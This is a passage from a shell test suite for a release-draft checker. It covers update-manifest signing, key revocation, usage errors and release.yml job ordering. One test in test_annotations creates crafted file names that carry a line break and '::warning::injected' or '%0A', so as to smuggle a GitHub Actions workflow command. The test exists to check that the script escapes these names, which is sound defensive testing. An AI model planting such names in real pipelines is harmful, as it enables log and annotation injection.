    "$(if [ -e "$d/rel/$MANIFEST.sig" ]; then echo yes; else echo no; fi)"

  d=$(sign_job_dir revoke-backup "$REVOKED")
  run_step sign "$step" "$d" "$BACKUP_KEY"
  assert_eq 'sign: signs a revocation with the backup key' 0 "$RC"
  assert_contains 'sign: signs a revocation with the backup key: says so' 'the key is the backup key' "$OUT"
  check_u "$d/rel"
  assert_eq 'sign: the backup-signed revocation passes check-draft.sh' 0 "$RC"

  d=$(sign_job_dir no-secret)
  run_step sign "$step" "$d"
  assert_eq 'sign: without the secret: exit code' 1 "$RC"
  assert_contains 'sign: without the secret: the error' 'has no secret RELEASE_UPDATE_SIGNING_KEY' "$OUT"

  # A key that update_signers doesn't have: the verify after the signature catches it.
  d=$(sign_job_dir wrong-key)
  run_step sign "$step" "$d" "$OTHER_KEY"
  assert_eq 'sign: a key that update_signers lacks fails' failed "$(if [ "$RC" -ne 0 ]; then echo failed; else echo passed; fi)"
  assert_contains 'sign: a key that update_signers lacks fails: at the verify' 'signed isshoni-desktop-update.json with the update key' "$OUT"

  d=$(sign_job_dir no-manifest)
  rm "$d/rel/$MANIFEST"
  run_step sign "$step" "$d" "$UPDATE_KEY"
  assert_eq 'sign: no manifest: exit code' 1 "$RC"
  assert_contains 'sign: no manifest: the error' "the draft has no $MANIFEST" "$OUT"

  # sign-dry makes its own update keys: its update_signers checks what it signed, with check-draft.sh too.
  step='Sign the update manifest with throwaway update keys and verify it'
  for case in empty revoking; do
    if [ "$case" = empty ]; then d=$(sign_job_dir dry-$case); else d=$(sign_job_dir dry-$case "$REVOKED"); fi
    run_step sign-dry "$step" "$d"
    assert_eq "sign-dry ($case revokedKeys): exit code" 0 "$RC"
    check_in "$WORK/elsewhere" "$d/rel" "$SIGNERS" "$d/keys/update_signers"
    assert_eq "sign-dry ($case revokedKeys): passes check-draft.sh with its update_signers" 0 "$RC"
    assert_eq "sign-dry ($case revokedKeys): one key and one backup line" 2 \
      "$(grep -c '^isshoni-update namespaces="isshoni-update" ssh-ed25519 .* isshoni-update-\(backup-\)\{0,1\}1$' "$d/keys/update_signers" || true)"
    assert_eq "sign-dry ($case revokedKeys): no private key left" 0 \
      "$(find "$d/runner-temp" -type f ! -name '*.pub' | wc -l | tr -d ' ')"
  done
}

# ---------------------------------------------------------------------------------------------------------------
# Usage, and the annotations in GitHub Actions

test_usage() {
  check_in "$WORK/elsewhere"
  assert_eq 'no arguments: exit code' 2 "$RC"
  assert_contains 'no arguments: usage' 'Usage: sh ' "$OUT"
  check_in "$WORK/elsewhere" "$SIGNED" "$SIGNERS" "$UPDATE_SIGNERS" extra
  assert_eq 'four arguments: exit code' 2 "$RC"
  check_in "$WORK/elsewhere" -h
  assert_eq '-h: exit code' 0 "$RC"
  assert_contains '-h: usage' 'DIR ALLOWED_SIGNERS' "$OUT"
  expect_fail 'DIR is no directory' "$WORK/no-such-draft" "$WORK/no-such-draft is not a directory"
}

test_annotations() {
  d=$(draft annotated)
  printf 'added\n' >"$d/extra.tar.gz"
  # A name with a line break, which must not start a workflow command of its own.
  nl='
'
  printf 'added\n' >"$d/evil$nl::warning::injected"
  # And one with "%0A" in it, which the runner would decode into a line break of the annotation.
  printf 'added\n' >"$d/x%0Ay"
  GITHUB_ACTIONS=true
  export GITHUB_ACTIONS
  check "$d"
  unset GITHUB_ACTIONS
  assert_eq 'in GitHub Actions: exit code' 1 "$RC"
  assert_contains 'in GitHub Actions: an error annotation' \
    '::error::check-draft: the draft has extra.tar.gz, which checksums.txt does not list' "$OUT"
  assert_contains 'in GitHub Actions: the line break is shown as ?' \
    '::error::check-draft: the draft has evil?::warning::injected, which' "$OUT"
  assert_eq 'in GitHub Actions: no line starts a command of its own' 0 \
    "$(printf '%s\n' "$OUT" | grep -c '^::warning::' || true)"
  assert_contains 'in GitHub Actions: % is escaped as %25' '::error::check-draft: the draft has x%250Ay, which' "$OUT"

  # Outside GitHub Actions the name stays as it is.
  check "$d"
  assert_contains 'outside GitHub Actions: % stays %' 'check-draft: the draft has x%0Ay, which' "$OUT"
  assert_lacks 'outside GitHub Actions: no annotation' '::error::' "$OUT"
}

# ---------------------------------------------------------------------------------------------------------------
# release.yml runs the script, and sign's own checks stay strict

# job NAME prints the lines of release.yml's job NAME.
job() {
  awk -v job="  $1:" '
    $0 == job { on = 1; print; next }
    on && /^  [A-Za-z0-9_-]+:/ { exit }
    on { print }' "$RELEASE_YML"
}

# line_no first|last ERE [AFTER] prints the number of the first or the last line of stdin after the line AFTER
# (default 0) that matches the extended regular expression ERE, or 0 when there is none. Comment lines don't count.
# ERE comes from the environment, so that awk -v doesn't turn its backslashes into escapes.
line_no() {
  LINE_NO_RE=$2 awk -v which="$1" -v after="${3:-0}" '
    NR <= after || /^ *#/ { next }
    $0 ~ ENVIRON["LINE_NO_RE"] { n = NR; if (which == "first") exit }
    END { print n + 0 }'
}

# keys_between A B prints how many lines of stdin between the lines A and B are a step's `if:` or
# `continue-on-error:` (also as the step's first key, after its "- "), either of which could let a later step run
# after a failed check.
keys_between() {
  awk -v a="$1" -v b="$2" 'NR > a && NR < b && /^ *(- )?(if|continue-on-error):/ { n++ } END { print n + 0 }'
}

# ascending N... prints "ascending" when every N is above the one before it and the first is above 0, and
# otherwise "not ascending:" with the list.
ascending() {
  asc_prev=0
  for asc_n; do
    if [ "$asc_n" -le "$asc_prev" ]; then
      printf 'not ascending: %s\n' "$*"
      return 0
    fi
    asc_prev=$asc_n
  done
  printf 'ascending\n'
}

test_release_yml() {
  publish=$(job publish)
  # publish runs the script on rel/ with deploy/keys/allowed_signers and deploy/keys/update_signers, and a failure
  # ends the step with exit 1: an `|| true` on the line, or an if that goes on, would let the draft go public.
  assert_eq 'release.yml: publish fails when check-draft.sh fails' 1 \
    "$(printf '%s\n' "$publish" |
      grep -c '^ *if ! sh deploy/release/check-draft\.sh rel deploy/keys/allowed_signers deploy/keys/update_signers; then$' || true)"
  # And only after verify-windows passed too (M2 06 §11.1).
  assert_eq 'release.yml: publish needs verify and verify-windows' 1 \
    "$(printf '%s\n' "$publish" | grep -c '^    needs: \[version, verify, verify-windows\]$' || true)"
  assert_eq 'release.yml: publish runs only after both verify jobs succeeded' 1 \
    "$(printf '%s\n' "$publish" | grep -c "needs\.verify\.result == 'success' && needs\.verify-windows\.result == 'success'" || true)"
  guard=$(printf '%s\n' "$publish" | awk '
    /^ *if ! sh deploy\/release\/check-draft\.sh / { on = 1; next }
    on && /^ *fi$/ { exit }
    on && /exit/ { sub(/^ */, ""); print }')
  assert_eq 'release.yml: publish exits 1 when check-draft.sh fails, and exits nowhere else in that if' \
    'exit 1' "$guard"
  # In this order: the last download of the draft, the check, and the first --draft=false; and between the
  # download and --draft=false no step has an if: or continue-on-error: that could publish after a failed check.
  dl=$(printf '%s\n' "$publish" | line_no last 'gh release download "[$]TAG"')
  ck=$(printf '%s\n' "$publish" | line_no first 'sh deploy/release/check-draft\.sh')
  pub=$(printf '%s\n' "$publish" | line_no first '--draft=false')
  assert_eq 'release.yml: publish downloads the draft, then checks it, then publishes it' ascending \
    "$(ascending "$dl" "$ck" "$pub")"
  assert_eq 'release.yml: publish has no if: or continue-on-error: from the download to --draft=false' 0 \
    "$(printf '%s\n' "$publish" | keys_between "$dl" "$pub")"
  assert_eq 'release.yml: publish checks out deploy/release' 1 \
    "$(printf '%s\n' "$publish" | grep -c '^ *deploy/release$' || true)"
  assert_eq 'release.yml: publish has no inline copy of the check left' 0 \
    "$(printf '%s\n' "$publish" | grep -v '^ *#' | grep -c 'sha256sum\|ssh-keygen' || true)"

  # sign and sign-dry check the draft inline, before they sign it: with --strict, then with dotglob and nullglob
  # set, a loop over rel/ that exits 1 on an asset that checksums.txt does not list, hidden ones included; and no
  # if: or continue-on-error: from that step to the signature.
  for j in sign sign-dry; do
    body=$(job "$j")
    assert_eq "release.yml: $j runs sha256sum --strict -c" 1 \
      "$(printf '%s\n' "$body" | grep -c '^ *(cd rel && sha256sum --strict -c checksums\.txt)$' || true)"
    assert_eq "release.yml: $j counts hidden files (dotglob nullglob)" 1 \
      "$(printf '%s\n' "$body" | grep -c '^ *shopt -s dotglob nullglob$' || true)"
    assert_eq "release.yml: $j walks the draft for unlisted assets" 1 \
      "$(printf '%s\n' "$body" | grep -c '^ *for f in rel/\*; do$' || true)"
    assert_eq "release.yml: $j fails on an unlisted asset" 1 \
      "$(printf '%s\n' "$body" | grep -c 'which checksums\.txt does not list"$' || true)"
    # The names it lets through are the two signatures and the cosign bundle (sign-dry has no checksums.txt.sig
    # yet), as check-draft.sh's list.
    case $j in
    sign) want='checksums.txt | checksums.txt.sig | checksums.txt.sigstore.json | isshoni-desktop-update.json.sig' ;;
    *) want='checksums.txt | checksums.txt.sigstore.json | isshoni-desktop-update.json.sig' ;;
    esac
    assert_eq "release.yml: $j lets through only its own files" 1 \
      "$(printf '%s\n' "$body" | grep -cF "case \$name in $want) continue ;; esac" || true)"
    step=$(printf '%s\n' "$body" | line_no first '^ *- name: Every asset matches checksums\.txt$')
    strict=$(printf '%s\n' "$body" | line_no first 'sha256sum --strict -c')
    glob=$(printf '%s\n' "$body" | line_no first '^ *shopt -s dotglob nullglob$')
    loop=$(printf '%s\n' "$body" | line_no first '^ *for f in rel/\*; do$')
    msg=$(printf '%s\n' "$body" | line_no first 'which checksums\.txt does not list"$')
    ex=$(printf '%s\n' "$body" | line_no first '^ *exit 1$' "$msg")
    endif=$(printf '%s\n' "$body" | line_no first '^ *fi$' "$msg")
    endloop=$(printf '%s\n' "$body" | line_no first '^ *done$' "$msg")
    sig=$(printf '%s\n' "$body" | line_no first 'ssh-keygen -Y sign ')
    assert_eq "release.yml: $j checks with --strict, sets dotglob nullglob, walks rel/, exits 1, then signs" \
      ascending "$(ascending "$step" "$strict" "$glob" "$loop" "$msg" "$ex" "$endif" "$endloop" "$sig")"
    assert_eq "release.yml: $j has no if: or continue-on-error: from its check to the signature" 0 \
      "$(printf '%s\n' "$body" | keys_between "$step" "$sig")"
  done
}

# ---------------------------------------------------------------------------------------------------------------

printf 'check-draft-test: deploy/release/check-draft.sh under %s\n' "$SH"
test_good
test_unlisted
test_checksums
test_signature
test_manifest
test_revocation
test_sign_steps
test_usage
test_annotations
test_release_yml

printf '%s passed, %s failed\n' "$PASSED" "$FAILED"
[ "$FAILED" -eq 0 ]
